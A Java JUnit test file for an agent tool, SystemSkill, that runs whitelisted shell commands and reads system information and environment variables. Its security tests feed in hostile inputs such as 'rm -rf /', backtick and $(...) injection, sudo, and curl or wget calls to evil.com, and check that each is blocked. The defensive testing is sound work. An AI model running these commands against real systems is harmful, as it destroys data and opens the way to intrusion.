/*
 * Copyright (C) 2026 Eber Cruz Fararoni. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package dev.fararoni.core.core.skills;

import dev.fararoni.bus.agent.api.AgentAction;
import dev.fararoni.bus.agent.api.ToolSkill;
import org.junit.jupiter.api.*;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Path;
import java.util.Arrays;

import static org.assertj.core.api.Assertions.*;

/**
 * @author Eber Cruz
 * @version 1.0.0
 * @since 1.0.0
 */
@DisplayName("SystemSkill Tests")
class SystemSkillTest {
    @TempDir
    Path tempDir;

    private SystemSkill skill;

    @BeforeEach
    void setUp() {
        skill = new SystemSkill(tempDir);
    }

    @Nested
    @DisplayName("ToolSkill Interface")
    class ToolSkillInterfaceTests {
        @Test
        @DisplayName("Should implement ToolSkill")
        void shouldImplementToolSkill() {
            assertThat(skill).isInstanceOf(ToolSkill.class);
        }

        @Test
        @DisplayName("Should return SYSTEM as skill name")
        void shouldReturnSystemAsSkillName() {
            assertThat(skill.getSkillName()).isEqualTo("SYSTEM");
        }

        @Test
        @DisplayName("Should have description")
        void shouldHaveDescription() {
            assertThat(skill.getDescription()).isNotBlank();
        }

        @Test
        @DisplayName("Should have at least 4 actions")
        void shouldHaveAtLeast4Actions() {
            long actionCount = Arrays.stream(SystemSkill.class.getMethods())
                .filter(m -> m.isAnnotationPresent(AgentAction.class))
                .count();

            assertThat(actionCount).isGreaterThanOrEqualTo(4);
        }
    }

    @Nested
    @DisplayName("exec() Action - Whitelist")
    class ExecWhitelistTests {
        @Test
        @DisplayName("Should execute date command")
        void shouldExecuteDateCommand() {
            String result = skill.exec("date");

            assertThat(result).isNotBlank();
            assertThat(result).doesNotContainIgnoringCase("error");
        }

        @Test
        @DisplayName("Should execute echo command")
        void shouldExecuteEchoCommand() {
            String result = skill.exec("echo hello");

            assertThat(result).contains("hello");
        }

        @Test
        @DisplayName("Should execute pwd command")
        void shouldExecutePwdCommand() {
            String result = skill.exec("pwd");

            assertThat(result).contains(tempDir.getFileName().toString());
        }

        @Test
        @DisplayName("Should reject empty command")
        void shouldRejectEmptyCommand() {
            String result = skill.exec("");

            assertThat(result).containsIgnoringCase("error");
        }

        @Test
        @DisplayName("Should reject null command")
        void shouldRejectNullCommand() {
            String result = skill.exec(null);

            assertThat(result).containsIgnoringCase("error");
        }
    }

    @Nested
    @DisplayName("exec() Action - Security")
    class ExecSecurityTests {
        @Test
        @DisplayName("Should block rm -rf")
        void shouldBlockRmRf() {
            String result = skill.exec("rm -rf /");

            assertThat(result).containsIgnoringCase("error");
            assertThat(result).containsIgnoringCase("blocked");
        }

        @Test
        @DisplayName("Should block sudo")
        void shouldBlockSudo() {
            String result = skill.exec("sudo ls");

            assertThat(result).containsIgnoringCase("error");
            assertThat(result).containsIgnoringCase("blocked");
        }

        @Test
        @DisplayName("Should block command not in whitelist")
        void shouldBlockCommandNotInWhitelist() {
            String result = skill.exec("vim file.txt");

            assertThat(result).containsIgnoringCase("error");
            assertThat(result).containsIgnoringCase("whitelist");
        }

        @Test
        @DisplayName("Should block command injection with backticks")
        void shouldBlockCommandInjectionBackticks() {
            String result = skill.exec("echo `rm -rf /`");

            assertThat(result).containsIgnoringCase("error");
            assertThat(result).containsIgnoringCase("blocked");
        }

        @Test
        @DisplayName("Should block command injection with $(...)")
        void shouldBlockCommandInjectionDollarParen() {
            String result = skill.exec("echo $(rm -rf /)");

            assertThat(result).containsIgnoringCase("error");
            assertThat(result).containsIgnoringCase("blocked");
        }

        @Test
        @DisplayName("Should block curl")
        void shouldBlockCurl() {
            String result = skill.exec("curl http://evil.com");

            assertThat(result).containsIgnoringCase("error");
        }

        @Test
        @DisplayName("Should block wget")
        void shouldBlockWget() {
            String result = skill.exec("wget http://evil.com");

            assertThat(result).containsIgnoringCase("error");
        }
    }

    @Nested
    @DisplayName("info() Action")
    class InfoActionTests {
        @Test
        @DisplayName("Should return system info")
        void shouldReturnSystemInfo() {
            String result = skill.info();

            assertThat(result).contains("OS:");
            assertThat(result).contains("User:");
            assertThat(result).contains("Java:");
        }
    }

    @Nested
    @DisplayName("env() Action")
    class EnvActionTests {
        @Test
        @DisplayName("Should return HOME variable")
        void shouldReturnHomeVariable() {
            String result = skill.env("HOME");

            assertThat(result).isNotBlank();
        }

        @Test
        @DisplayName("Should return PATH variable")
        void shouldReturnPathVariable() {
            String result = skill.env("PATH");

            assertThat(result).isNotBlank();
        }

        @Test
        @DisplayName("Should block sensitive variables")
        void shouldBlockSensitiveVariables() {
            String result = skill.env("MY_PASSWORD");

            assertThat(result).containsIgnoringCase("error");
            assertThat(result).containsIgnoringCase("sensitive");
        }

        @Test
        @DisplayName("Should handle missing variable")
        void shouldHandleMissingVariable() {
            String result = skill.env("DEFINITELY_NOT_SET_12345");

            assertThat(result).isEqualTo("Not set");
        }
    }

    @Nested
    @DisplayName("pwd() Action")
    class PwdActionTests {
        @Test
        @DisplayName("Should return workspace path")
        void shouldReturnWorkspacePath() {
            String result = skill.pwd();

            assertThat(result).isEqualTo(tempDir.toAbsolutePath().toString());
        }
    }

    @Nested
    @DisplayName("whoami() Action")
    class WhoamiActionTests {
        @Test
        @DisplayName("Should return username")
        void shouldReturnUsername() {
            String result = skill.whoami();

            assertThat(result).isEqualTo(System.getProperty("user.name"));
        }
    }
}
